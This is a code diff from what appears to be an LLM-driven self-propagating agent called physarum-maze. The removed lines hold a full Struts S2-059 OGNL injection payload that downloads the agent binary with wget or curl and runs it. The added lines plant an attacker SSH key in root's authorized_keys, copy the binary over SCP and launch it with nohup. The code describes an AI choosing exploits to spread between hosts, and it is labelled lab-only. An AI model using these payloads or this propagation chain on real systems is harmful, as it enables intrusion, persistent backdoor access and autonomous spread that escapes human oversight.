@@ -87,85 +87,104 @@ impl MockLlmClient {
         })
     }
 
-    /// Returns an Exploit strategy for CVE-2020-17530 (Struts S2-059 OGNL injection).
+    /// Returns an Exploit strategy for any confirmed RCE CVE — SSH-first delivery.
     ///
-    /// Used by `--llm-endpoint mock-exploit` in the Docker Lab Phase 2 dry-run:
-    /// validates the full exploit pipeline (binary server, OGNL HttpPost, nohup exec)
-    /// without a real LLM. The executor fires a real HttpPost with the OGNL header.
+    /// Used by `--llm-endpoint mock-exploit[:<ip>[:<port>]]` for Phase 2 dry-run:
+    ///   Step 1 — HttpPost: CVE RCE payload plants ephemeral pubkey in authorized_keys.
+    ///   Step 2 — ScpUpload: transfers physarum-maze binary via SSH (ephemeral key).
+    ///   Step 3 — SshCommand: executes binary with nohup in background.
     ///
-    /// `source_ip` must match the agent's IP on the internal lab network.
-    /// `target_port` is the HTTP port where Container B listens (e.g. 8080).
-    pub fn exploit_struts_s2_059(
-        source_ip: impl Into<String>,
+    /// This mirrors the SSH-first path the real LLM would choose when port 22 is open.
+    /// `pubkey` is the ephemeral pubkey string injected at runtime by the executor.
+    /// `target_port` is the HTTP port of the vulnerable service (e.g. 8080 for Struts).
+    pub fn exploit_rce_ssh_first(
+        pubkey: impl Into<String>,
         target_port: u16,
+        remote_user: impl Into<String>,
         confidence: f32,
     ) -> Self {
-        let src = source_ip.into();
-        let cmd = format!(
-            "mkdir -p /tmp/physarum && \
-             (wget -q http://{src}:8001/physarum-maze -O /tmp/physarum/physarum-maze \
-              || curl -s -o /tmp/physarum/physarum-maze http://{src}:8001/physarum-maze) && \
-             chmod +x /tmp/physarum/physarum-maze && \
-             nohup /tmp/physarum/physarum-maze --mode propagated \
-               >/tmp/physarum/agent.log 2>&1 &"
-        );
-        // S2-059 OGNL Content-Type payload — #process.waitFor() blocks until the
-        // shell exits. With `nohup ... &` the shell forks and returns in milliseconds.
-        let ognl = format!(
-            "%{{(#_='multipart/form-data').\
-             (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\
-             (#_memberAccess?(#_memberAccess=#dm):\
-               ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\
-                (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\
-                (#ognlUtil.getExcludedPackageNames().clear()).\
-                (#ognlUtil.getExcludedClasses().clear()).\
-                (#context.setMemberAccess(#dm)))).\
-             (#cmd='{cmd}').\
-             (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\
-             (#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).\
-             (#p=new java.lang.ProcessBuilder(#cmds)).\
-             (#p.redirectErrorStream(true)).\
-             (#process=#p.start()).\
-             (#process.waitFor())}}.multipart/form-data",
-            cmd = cmd
+        let pubkey = pubkey.into();
+        let user = remote_user.into();
+
+        // Step 1: RCE payload plants the pubkey — LLM would fill in CVE-specific syntax.
+        // Mock uses a generic shell command as placeholder (real LLM uses CVE-specific injection).
+        let pubkey_cmd = format!(
+            "mkdir -p /root/.ssh && chmod 700 /root/.ssh \
+             && echo '{pubkey}' >> /root/.ssh/authorized_keys \
+             && chmod 600 /root/.ssh/authorized_keys"
         );
 
         Self::new(PropagationStrategy {
             method: crate::types::PropagationMethod::Exploit {
-                cve: "CVE-2020-17530".into(),
+                cve: "CVE-MOCK-RCE".into(),
             },
             artifact_type: ArtifactType::AgentBinary,
             bootstrap_plan: Some(BootstrapPlan {
-                steps: vec![BootstrapStep {
-                    action: crate::types::BootstrapAction::HttpPost {
-                        path: "/showcase.action".into(),
-                        body: String::new(),
-                        port: Some(target_port),
-                        headers: vec![("Content-Type".into(), ognl)],
-                        accept_any_response: true,
+                steps: vec![
+                    // Step 1: plant pubkey via RCE
+                    BootstrapStep {
+                        action: crate::types::BootstrapAction::HttpPost {
+                            path: "/exploit".into(),
+                            body: String::new(),
+                            port: Some(target_port),
+                            headers: vec![("X-Rce-Cmd".into(), pubkey_cmd)],
+                            accept_any_response: true,
+                        },
+                        target: String::new(),
+                        timeout_ms: 10_000,
+                        requires_root: false,
+                        expected_result: ExpectedResult {
+                            success_indicator: "RCE fired — pubkey planted".into(),
+                            failure_indicator: Some("Connection refused or timeout".into()),
+                        },
                     },
-                    target: String::new(), // filled at runtime from target IP
-                    timeout_ms: 10_000,
-                    requires_root: false,
-                    expected_result: ExpectedResult {
-                        success_indicator: "OGNL fired (any HTTP status)".into(),
-                        failure_indicator: Some("Connection refused or timeout".into()),
+                    // Step 2: SCP the binary (executor uses ephemeral key automatically)
+                    BootstrapStep {
+                        action: crate::types::BootstrapAction::ScpUpload {
+                            local_path: "__self__".into(),
+                            remote_path: "/tmp/physarum/physarum-maze".into(),
+                            user: Some(user.clone()),
+                        },
+                        target: String::new(),
+                        timeout_ms: 15_000,
+                        requires_root: false,
+                        expected_result: ExpectedResult {
+                            success_indicator: "SCP exit 0".into(),
+                            failure_indicator: Some("SCP error".into()),
+                        },
                     },
-                }],
+                    // Step 3: execute in background
+                    BootstrapStep {
+                        action: crate::types::BootstrapAction::SshCommand {
+                            command: "mkdir -p /tmp/physarum && chmod +x /tmp/physarum/physarum-maze \
+                                     && nohup /tmp/physarum/physarum-maze --mode propagated \
+                                        >/tmp/physarum/agent.log 2>&1 &"
+                                .into(),
+                            user: Some(user.clone()),
+                        },
+                        target: String::new(),
+                        timeout_ms: 10_000,
+                        requires_root: false,
+                        expected_result: ExpectedResult {
+                            success_indicator: "SSH exit 0".into(),
+                            failure_indicator: Some("SSH error".into()),
+                        },
+                    },
+                ],
             }),
             confidence,
             reasoning_summary: format!(
-                "Mock: CVE-2020-17530 S2-059 OGNL exploit → wget physarum-maze from {src}:8001 → nohup exec."
+                "Mock: RCE → pubkey injection → SCP binary (user={user}) → nohup exec via SSH."
             ),
             preconditions: vec![
-                "Port open (Struts 2.5.x HTTP)".into(),
-                "CVE-2020-17530 template confirmed".into(),
-                "physarum-maze binary server running on source_ip:8001".into(),
+                "HTTP port open (vulnerable service)".into(),
+                "Port 22 open (sshd running on target)".into(),
+                "RCE confirmed by CVE template".into(),
             ],
-            validation_check: Some("/tmp/physarum/physarum-maze exists on target".into()),
+            validation_check: Some("/tmp/physarum/physarum-maze running on target".into()),
             safety_notes: vec![
                 "Mock exploit client — Docker Lab Phase 2 only.".into(),
-                "OGNL executes arbitrary commands on target.".into(),
+                "RCE + SSH access — isolated lab environment only.".into(),
             ],
         })
     }
